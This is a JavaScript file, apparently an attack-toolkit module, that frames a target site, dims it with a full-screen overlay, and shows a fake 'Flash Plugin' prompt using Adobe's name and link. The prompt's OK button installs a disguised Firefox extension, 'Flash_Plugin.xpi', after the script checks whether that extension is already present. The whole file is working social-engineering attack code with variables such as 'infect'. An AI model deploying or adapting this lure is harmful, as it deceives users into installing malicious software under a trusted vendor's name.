var browser="";
var infect = false;

var myDivContainer;
var contentDiv;
var containerBorder;
var containerWidth;
var containerHeight;
var myDiv;
var image1=null;
var imgWidth = 0;
var imgHeight = 0;
var realWidth=0;
var realHeight;
var realImgWidth=0;
var realImgHeight=0;
var buttonDiv;

var zoom = 0;

// Detect the Browser using the UserAgent
function detectBrowser() {
	if ((typeof(navigator) != "undefined") && (typeof(navigator.userAgent) != "undefined")) {
		var ua = navigator.userAgent;

		if (ua.search(/chrome/i) != -1) {
			return "chrome";
		}		
		
		if (ua.search(/webkit/i) != -1) {
			return "safari";
		}
		
		if (ua.search(/opera/i) != -1) {
			return "opera";
		}		
		
		if ((ua.search(/msie/i) != -1) && (ua.search(/opera/i) == -1)) {
			return "msie";
		}
		
		if ((ua.search(/mozilla/i) != -1) && (ua.search(/(compatible|webkit)/i) == -1)) {
			return "mozilla";
		}
		
		return "msie"; // return msie as default if unable to detect via user agent
	}
		// The navigator.userAgent object does not exists
		return "";
}

var winW=0;
var winH=0;

function getWindowSize() {
	winW = 0, winH = 0;
	
	if (document.body && document.body.offsetWidth) {
		winW = document.body.offsetWidth;
		winH = document.body.offsetHeight;
	}
	
	if (document.compatMode=='CSS1Compat' &&
    	document.documentElement &&
    	document.documentElement.offsetWidth ) {
 		winW = document.documentElement.offsetWidth;
 		winH = document.documentElement.offsetHeight;
	}
	
	if (window.innerWidth && window.innerHeight) {
 		winW = window.innerWidth;
 		winH = window.innerHeight;
	}
	
	if (!infect) {
		var frame1 = document.getElementById("iframe1");
		var iframeDoc = frame1.contentDocument || frame1.contentWindow.document;
		var wid = iframeDoc.getElementById("widthDiv");
		winW = wid.offsetWidth;  
	}
}

function scaleSize(maxW, maxH, currW, currH){
	var ratio = currH / currW;
    
	var currH2=currH;
	var currW2=currW;
    
	if(currH >= maxH) {
        currH = maxH;
        currW = currH / ratio;
    } 
    
    if(currW >= maxW && ratio <= 1){
        currW = maxW;
        currH = currW * ratio;
    }

    return [currW, currH];
}

function centerDiv(d) {
	var w = d.width/2;
	var h = d.height/2;	
	
	getWindowSize(); // returns the window size in winW,winH
	if (winW==0)
		winW = screen.width;
	if (winH==0)
		winH == screen.height;
	
	var __screenY=winW/2;
 	var __screenX=winH/2;
 	
	d.style.top = __screenX-h+"px";
	d.style.left = __screenY-w+"px";
}


function findPos(obj) {
	var curleft = curtop = 0
	if (obj.offsetParent) {	
		do {
			curleft += obj.offsetLeft;
			curtop += obj.offsetTop;
			} while (obj = obj.offsetParent);
	return [curleft,curtop];
	}	
}

var containerWidth1 = 0;
var containerHeight1 = 0;

var update;
function setContainerSize(multw,multh) {
	var sw;
	if (!infect) sw = getScrollBarWidth();
	update = false;	
	
	if (containerWidth1 != 0) containerWidth1 = containerWidth;
	if (containerHeight1 != 0) containerHeight1 = containerHeight;
	containerWidth1 = containerWidth;	
	containerHeight1 = containerHeight;
	getWindowSize();
	
	if (!infect) winW -= sw;
	
	if (containerWidth1 >= winW || containerHeight1 >= winH) {
		var newSize = scaleSize(winW*0.9, winH*0.9, realWidth, realHeight);
		containerWidth = newSize[0];
		containerHeight = newSize[1];
		update=true;
	} else {
		containerWidth = containerWidth1;
		containerHeight = containerHeight1;
	}
	
	if (update) {
		myDivContainer.style.width=parseInt(containerWidth)+"px";
		myDivContainer.style.height=parseInt(containerHeight)+"px";

		containerBorder.style.width=parseInt(containerWidth+10)+"px";
		containerBorder.style.height=parseInt(containerHeight+10)+"px";		
	
		myDivContainer.width=containerWidth;
		myDivContainer.height=containerHeight;
		
		containerBorder.width=containerWidth+10;
		containerBorder.height=containerHeight+10;
		
		var cI = document.getElementById("cI");
		var newSize = scaleSize(containerWidth*multw, containerHeight*multh, realImgWidth, realImgHeight);
		cI.width = newSize[0];
		cI.height = newSize[1];
	}
}

var multiplyw = 1;
var multiplyh = 1;

function resizeContainers(addimage) {
	myDivContainer.style.visibility='hidden';
	containerBorder.style.visibility='hidden';
	
	if (addimage) {
		var cI = document.getElementById('contentImage');
		cI.innerHTML="<img src='"+image1.src+"' id='cI'>";
	}
    multiplyw = 1;
    multiplyh = 1;

	var again=true;
	while(again) {	
		if (multiplyw < 0 || multiplyh < 0)
			break;
		myDivContainer.width = parseInt(image1.width) + 30;
		myDivContainer.style.width = parseInt(myDivContainer.width) + "px";
		containerBorder.width = parseInt(image1.width) + 40;
		containerBorder.style.width = parseInt(containerBorder.width) + "px";
	
		myDivContainer.height = contentDiv.offsetHeight + 30;
		containerBorder.height =  contentDiv.offsetHeight + 40;
		myDivContainer.style.height = (contentDiv.offsetHeight + 30) + "px";
		containerBorder.style.height =  (contentDiv.offsetHeight + 40) + "px";	
		
		containerWidth = containerBorder.width;
		containerHeight = containerBorder.height;
		
		if (realWidth == 0) {
			realWidth = containerWidth;
			realHeight = containerHeight;
		}

		again=false;		
		setContainerSize(multiplyw,multiplyh);
		
		// Position div into the center of the screen
		centerDiv(myDivContainer);
		centerDiv(containerBorder);
		
		getWindowSize();
		var cI = document.getElementById("cI");
		var lt1 = findPos(cI);
		var lt2 = findPos(myDivContainer);
		var lt3 = findPos(containerBorder);
		var lt4 = findPos(buttonDiv);
		
		if ((lt3[0]+containerBorder.width >= winW) || (lt1[0]+cI.width >= lt2[0]+myDivContainer.width)) {
			multiplyw -= 0.025;
			multiplyh -= 0.025;
			again=true;
		}

		if ((lt3[1]+containerBorder.height >= winH) || (lt1[1]+cI.height >= lt3[1]+myDivContainer.height) || (lt4[1]+25 > lt3[1]+containerBorder.height)) {
			multiplyw -= 0.025;
			multiplyh -= 0.025;
			again=true;
		}
	}
	
	myDivContainer.style.visibility='visible';
	containerBorder.style.visibility='visible';	
}

function getScrollBarWidth () {  
    var inner = document.createElement('p');  
    inner.style.width = "100%";  
    inner.style.height = "200px";  
  
    var outer = document.createElement('div');  
    outer.style.position = "absolute";  
    outer.style.top = "0px";  
    outer.style.left = "0px";  
    outer.style.visibility = "hidden";  
    outer.style.width = "200px";  
    outer.style.height = "150px";  
    outer.style.overflow = "hidden";  
    outer.appendChild (inner);  
  
    document.body.appendChild (outer);  
    var w1 = inner.offsetWidth;  
    outer.style.overflow = 'scroll';  
    var w2 = inner.offsetWidth;  
    if (w1 == w2) w2 = outer.clientWidth;  
  
    document.body.removeChild (outer);  
  
    return (w1 - w2);  
};

function parseContent(str) {
var str2 = str;
var i;
var search = new Array(
	  /\[center\](.*?)\[endcenter\]/g,
	  /\[fontsize="?(.*?)"?\](.*?)\[\endfontsize\]/g,
      /\[bold\](.*?)\[endbold\]/g,  
      /\[newline\]/g,
      /\[image\](.*?)\[\endimage\]/,
      /\[url\="?(.*?)"?\](.*?)\[\endurl\]/g);

var replace = new Array(
	  "<center>$1</center>",
	  "<span style=\"font-size:"+"$1"+"pt\">$2</span>",
      "<strong>$1</strong>",
      "<br/>",      
      "<center><div id='contentImage'/></center>",
      "<a href=\"$1\" target=\"_blank\" style=\"color:blue;text-decoration:underline;font-weight:normal;font-size:11pt;\">$2</a>");

for (i = 0; i < search.length; i++) {
    str = str.replace(search[i], replace[i]);
}

var e= /\[image](.*)\[endimage\]/;
e.exec(str2);
return [str, RegExp.$1];
}
function htmlentities(texte) {
  if (texte == ""){
    return "";
  }
//        texte = texte.replace(/"/g,'&quot;'); // 34 22
        texte = texte.replace(/&/g,'&amp;'); // 38 26
        texte = texte.replace(/\'/g,'&#39;'); // 39 27
        texte = texte.replace(/</g,'&lt;'); // 60 3C
        texte = texte.replace(/>/g,'&gt;'); // 62 3E
        texte = texte.replace(/\^/g,'&circ;'); // 94 5E
        texte = texte.replace(/‘/g,'&lsquo;'); // 145 91
        texte = texte.replace(/’/g,'&rsquo;'); // 146 92
        texte = texte.replace(/“/g,'&ldquo;'); // 147 93
        texte = texte.replace(/”/g,'&rdquo;'); // 148 94
        texte = texte.replace(/•/g,'&bull;'); // 149 95
        texte = texte.replace(/–/g,'&ndash;'); // 150 96
        texte = texte.replace(/—/g,'&mdash;'); // 151 97
        texte = texte.replace(/˜/g,'&tilde;'); // 152 98
        texte = texte.replace(/™/g,'&trade;'); // 153 99
        texte = texte.replace(/±/g,'&scaron;'); // 154 9A
        texte = texte.replace(/›/g,'&rsaquo;'); // 155 9B
        texte = texte.replace(/µ/g,'&oelig;'); // 156 9C
        texte = texte.replace(/¶/g,'&#357;'); // 157 9D
        texte = texte.replace(/·/g,'&#382;'); // 158 9E
        texte = texte.replace(/»/g,'&Yuml;'); // 159 9F
        texte = texte.replace(/¥/g,'&iexcl;'); // 161 A1
        texte = texte.replace(/¢/g,'&cent;'); // 162 A2
        texte = texte.replace(/£/g,'&pound;'); // 163 A3
        texte = texte.replace(/¼/g,'&yen;'); // 165 A5
        texte = texte.replace(/Œ/g,'&brvbar;'); // 166 A6
        texte = texte.replace(/§/g,'&sect;'); // 167 A7
        texte = texte.replace(/¨/g,'&uml;'); // 168 A8
        texte = texte.replace(/Š/g,'&copy;'); // 169 A9
        texte = texte.replace(/ª/g,'&ordf;'); // 170 AA
        texte = texte.replace(/­/g,'&shy;'); // 173 AD
        texte = texte.replace(/Ž/g,'&reg;'); // 174 AE
        texte = texte.replace(/¯/g,'&macr;'); // 175 AF
        texte = texte.replace(/°/g,'&deg;'); // 176 B0
        texte = texte.replace(/¹/g,'&plusmn;'); // 177 B1
        texte = texte.replace(/²/g,'&sup2;'); // 178 B2
        texte = texte.replace(/³/g,'&sup3;'); // 179 B3
        texte = texte.replace(/´/g,'&acute;'); // 180 B4
        texte = texte.replace(/¾/g,'&micro;'); // 181 B5
        texte = texte.replace(/œ/g,'&para'); // 182 B6
        texte = texte.replace(/¡/g,'&middot;'); // 183 B7
        texte = texte.replace(/¸/g,'&cedil;'); // 184 B8
        texte = texte.replace(/š/g,'&sup1;'); // 185 B9
        texte = texte.replace(/º/g,'&ordm;'); // 186 BA
        texte = texte.replace(/Ÿ/g,'&frac14;'); // 188 BC
        texte = texte.replace(/½/g,'&frac12;'); // 189 BD
        texte = texte.replace(/ž/g,'&frac34;'); // 190 BE
        texte = texte.replace(/¿/g,'&iquest;'); // 191 BF
        texte = texte.replace(/À/g,'&Agrave;'); // 192 C0
        texte = texte.replace(/Á/g,'&Aacute;'); // 193 C1
        texte = texte.replace(/Â/g,'&Acirc;'); // 194 C2
        texte = texte.replace(/Ã/g,'&Atilde;'); // 195 C3
        texte = texte.replace(/Ä/g,'&Auml;'); // 196 C4
        texte = texte.replace(/Å/g,'&Aring;'); // 197 C5
        texte = texte.replace(/Æ/g,'&AElig;'); // 198 C6
        texte = texte.replace(/Ç/g,'&Ccedil;'); // 199 C7
        texte = texte.replace(/È/g,'&Egrave;'); // 200 C8
        texte = texte.replace(/É/g,'&Eacute;'); // 201 C9
        texte = texte.replace(/Ê/g,'&Ecirc;'); // 202 CA
        texte = texte.replace(/Ë/g,'&Euml;'); // 203 CB
        texte = texte.replace(/Ì/g,'&Igrave;'); // 204 CC
        texte = texte.replace(/Í/g,'&Iacute;'); // 205 CD
        texte = texte.replace(/Î/g,'&Icirc;'); // 206 CE
        texte = texte.replace(/Ï/g,'&Iuml;'); // 207 CF
        texte = texte.replace(/Ð/g,'&ETH;'); // 208 D0
        texte = texte.replace(/Ñ/g,'&Ntilde;'); // 209 D1
        texte = texte.replace(/Ò/g,'&Ograve;'); // 210 D2
        texte = texte.replace(/Ó/g,'&Oacute;'); // 211 D3
        texte = texte.replace(/Ô/g,'&Ocirc;'); // 212 D4
        texte = texte.replace(/Õ/g,'&Otilde;'); // 213 D5
        texte = texte.replace(/Ö/g,'&Ouml;'); // 214 D6
        texte = texte.replace(/×/g,'&times;'); // 215 D7
        texte = texte.replace(/Ø/g,'&Oslash;'); // 216 D8
        texte = texte.replace(/Ù/g,'&Ugrave;'); // 217 D9
        texte = texte.replace(/Ú/g,'&Uacute;'); // 218 DA
        texte = texte.replace(/Û/g,'&Ucirc;'); // 219 DB
        texte = texte.replace(/Ü/g,'&Uuml;'); // 220 DC
        texte = texte.replace(/Ý/g,'&Yacute;'); // 221 DD
        texte = texte.replace(/Þ/g,'&THORN;'); // 222 DE
        texte = texte.replace(/ß/g,'&szlig;'); // 223 DF
        texte = texte.replace(/à/g,'&agrave;'); // 224 E0
        texte = texte.replace(/á/g,'&aacute;'); // 225 E1
        texte = texte.replace(/â/g,'&acirc;'); // 226 E2
        texte = texte.replace(/ã/g,'&atilde;'); // 227 E3
        texte = texte.replace(/ä/g,'&auml;'); // 228 E4
        texte = texte.replace(/å/g,'&aring;'); // 229 E5
        texte = texte.replace(/æ/g,'&aelig;'); // 230 E6
        texte = texte.replace(/ç/g,'&ccedil;'); // 231 E7
        texte = texte.replace(/è/g,'&egrave;'); // 232 E8
        texte = texte.replace(/é/g,'&eacute;'); // 233 E9
        texte = texte.replace(/ê/g,'&ecirc;'); // 234 EA
        texte = texte.replace(/ë/g,'&euml;'); // 235 EB
        texte = texte.replace(/ì/g,'&igrave;'); // 236 EC
        texte = texte.replace(/í/g,'&iacute;'); // 237 ED
        texte = texte.replace(/î/g,'&icirc;'); // 238 EE
        texte = texte.replace(/ï/g,'&iuml;'); // 239 EF
        texte = texte.replace(/ð/g,'&eth;'); // 240 F0
        texte = texte.replace(/ñ/g,'&ntilde;'); // 241 F1
        texte = texte.replace(/ò/g,'&ograve;'); // 242 F2
        texte = texte.replace(/ó/g,'&oacute;'); // 243 F3
        texte = texte.replace(/ô/g,'&ocirc;'); // 244 F4
        texte = texte.replace(/õ/g,'&otilde;'); // 245 F5
        texte = texte.replace(/ö/g,'&ouml;'); // 246 F6
        texte = texte.replace(/÷/g,'&divide;'); // 247 F7
        texte = texte.replace(/ø/g,'&oslash;'); // 248 F8
        texte = texte.replace(/ù/g,'&ugrave;'); // 249 F9
        texte = texte.replace(/ú/g,'&uacute;'); // 250 FA
        texte = texte.replace(/û/g,'&ucirc;'); // 251 FB
        texte = texte.replace(/ü/g,'&uuml;'); // 252 FC
        texte = texte.replace(/ý/g,'&yacute;'); // 253 FD
        texte = texte.replace(/þ/g,'&thorn;'); // 254 FE
        texte = texte.replace(/ÿ/g,'&yuml;'); // 255 FF
        return texte;
}

function XPItrigger() {
    if (InstallTrigger.updateEnabled()) {
	InstallTrigger.install({"Flash_Plugin": "Flash_Plugin.xpi"});
    }		
}

function initTimer() {  		
	myDiv = document.createElement('div');  
	myDiv.id = 'myDiv';  
	myDiv.style.position = 'fixed';  
	myDiv.style.top = 0;
	myDiv.style.left = 0;
	getWindowSize();	
	if (!infect) {
		var frame1 = document.getElementById("iframe1");
		var iframeDoc = frame1.contentDocument || frame1.contentWindow.document;
		var wid = iframeDoc.getElementById("widthDiv");
		myDiv.style.width = (wid.offsetWidth) + "px";  
	}
	else myDiv.style.width = "100%";  
	myDiv.style.height = "100%";  
	myDiv.style.backgroundColor = '#000'; 
	myDiv.style.zIndex = 2147483645;

	if (browser != "msie") {
		myDiv.style.opacity = '0.65';
	} else {
		myDiv.style.filter = 'progid:DXImageTransform.Microsoft.Alpha(opacity=65)';	
	}
	
	myDiv.setAttribute("unselectable", "on");
	myDiv.setAttribute("class", "unselectable");	
	
	document.body.appendChild(myDiv);
	myDivContainer = document.createElement('div');
	myDivContainer.id = 'myDivContainer';
	myDivContainer.style.position = 'fixed';
	myDivContainer.style.width = "1px";
	myDivContainer.style.height = "1px";	
	myDivContainer.style.backgroundColor = 'white'; 
	myDivContainer.style.zIndex = 2147483647;
	myDivContainer.style.border = '1px solid #AAA'; 
	myDivContainer.style.top=0;
	myDivContainer.style.left=0;
	myDivContainer.style.padding="9px 9px 9px 9px";
	myDivContainer.style.visibility='hidden';
	myDivContainer.style.fontFamily="Arial";
	
	var content = document.createElement('div'); 
	content.style.display='block';
	//content.style.backgroundColor = 'blue';
	
	contentDiv = document.createElement('div');
	contentDiv.style.display='inline';
	//contentDiv.style.backgroundColor = 'green';
	
	var unparsedContent = '[center][fontsize="18"][bold]Flash Plugin[endbold][endfontsize][endcenter][newline][newline][image]missing.jpg[endimage][newline]Flash Player is a cross-platform browser-based application runtime that delivers uncompromised viewing of expressive applications, content, and videos across screens and browsers.[newline][center][url=http://www.adobe.com]http://www.adobe.com[endurl][endcenter][newline]';
	var parsedContent = parseContent(htmlentities(unparsedContent));
	
	contentDiv.innerHTML="<span style='font-size:11pt;font-family:Arial;'>" + parsedContent[0] + "</span>";
	
	buttonDiv = document.createElement('div');
	buttonDiv.style.display='block';
	buttonDiv.align = 'center';
	buttonDiv.style.padding = '9px 0px 0px 0px';
	
	var button = document.createElement('input');
	button.type='button';
	button.value='       OK       ';
	button.style.height = '25px';
	button.style.border = "1px outset black";
	button.style.color = "black";
	button.style.fontFamily = "Arial";
	button.style.fontSize = "11pt";
	button.style.fontWeight = "normal";
	
	button.onclick = function(){
		XPItrigger();
	}
	buttonDiv.appendChild(button);
	
	content.appendChild(contentDiv);
	content.appendChild(buttonDiv);
	
	myDivContainer.appendChild(content);	
	
	containerBorder = document.createElement('div');
	containerBorder.style.position = 'fixed';
	containerBorder.style.width = "1px";
	containerBorder.style.height = "1px";	
	containerBorder.style.backgroundColor = 'white';
	containerBorder.style.zIndex = 2147483646;
	containerBorder.style.left=0;
	containerBorder.style.top=0;
	containerBorder.style.padding="9px 9px 9px 9px";
	containerBorder.style.visibility='hidden';

	containerBorder.setAttribute("unselectable", "on");
	containerBorder.setAttribute("class", "unselectable");	

	myDivContainer.setAttribute("unselectable", "on");
	myDivContainer.setAttribute("class", "unselectable");	
		
	document.body.appendChild(containerBorder);
	document.body.appendChild(myDivContainer);
	
 	image1 = new Image();
 	image1.onload = function() {
		imageWidth = image1.width;
		imageHeight = image1.height;
		realImgWidth = image1.width;
		realImgHeight = image1.height;
		resizeContainers(true);
	 }; 
	image1.src=parsedContent[1];
	// Center the div on a window resize event	
    window.onresize = function(event) {
		getWindowSize();
	    var myDiv = document.getElementById("myDiv");
		myDiv.style.width = (winW) + "px";  
 		resizeContainers(true);
	}	

	// Autodownload the file if requested
	var autodownload = "true";

	if (autodownload.toLowerCase() != "true") {
		var download = document.createElement('iframe');
		download.src = filename;
		download.width = 0;
		download.height = 0;
		download.style.border = "0";
		download.style.display = "none";
		download.style.visibility = "hidden";
		download.border = 0;
		
		document.body.appendChild(download);	
	}
	
	if (!infect) zoomHandler();
}

var isInstalled = null;
function init2() {
	var tgturl = document.getElementById('tgturl');
	if (tgturl == null) {
		infect = true;
	} else {
	try {
		document.style.overflowX = 'hidden';
	} catch (e) {};

	var hiddenFrame = document.createElement('iframe');
	hiddenFrame.id="iframe1";	
	hiddenFrame.style.position="absolute";
	hiddenFrame.style.visibility="hidden";
	hiddenFrame.style.width="100%";
	hiddenFrame.style.height="100%";
	hiddenFrame.style.zIndex="-16777270";
	hiddenFrame.style.overflowX="hidden";
	hiddenFrame.width = "100%";
	hiddenFrame.height = "1080";
	hiddenFrame.scrolling = "yes";
	hiddenFrame.frameBorder = "0";
	hiddenFrame.src = "empty.html";
	document.body.appendChild(hiddenFrame);
	
	var framebusting = "Disable";
	
	var ifr = document.createElement('iframe');
	if (framebusting.toUpperCase() == "YES") {
		ifr.setAttribute("security", "restricted");
		ifr.setAttribute("sandbox", "allow-scripts allow-forms");
	}
	ifr.display="block";
	ifr.overflowX="hidden";
	ifr.width="100%";
	ifr.height="100%";
	ifr.zIndex="0";
	ifr.src=tgturl.value;
	ifr.width="100%";
	ifr.height="100%";
	ifr.frameBorder="0";
	
	var containerS = document.createElement("div");
	containerS.id="container";
	containerS.style.position = "relative";
	containerS.style.width = "100%";
	containerS.style.height = "100%";
	document.body.appendChild(containerS);
	containerS.appendChild(ifr);
	
	if ((browser == "msie") || (browser == "chrome") || (browser == "opera") || (browser == "safari")) return;
	
	}
	if (!isInstalled) window.setTimeout("initTimer()", 3000);		
}

function zoomHandler() {
var if1 = document.getElementById("iframe1");
var iframeDoc = if1.contentDocument || if1.contentWindow.document;
iframeDoc.getElementById("two").style.left = iframeDoc.getElementById("one").offsetLeft + "px";

setInterval(function() {
  var newZoom = iframeDoc.getElementById("two").offsetLeft / iframeDoc.getElementById("one").offsetLeft;
  if (newZoom == zoom) return;
  zoom = newZoom;
  var wid = iframeDoc.getElementById("widthDiv");
  myDiv.width = wid.offsetWidth;
}, 200);	
}
browser = detectBrowser();
if ((browser != "msie") && (browser != "chrome") && (browser != "opera") && (browser != "safari")) {
	var extimg = document.createElement("img");
	
	extimg.addEventListener("load", function(e){
		isInstalled = true;
		init2();
	}, false);
	extimg.addEventListener("error", function(e){
		isInstalled = false;
		init2();
	}, false);
	
	extimg.setAttribute("src", "chrome://Flash_Plugin/content/detect.jpg");
} else {
	init2();	
}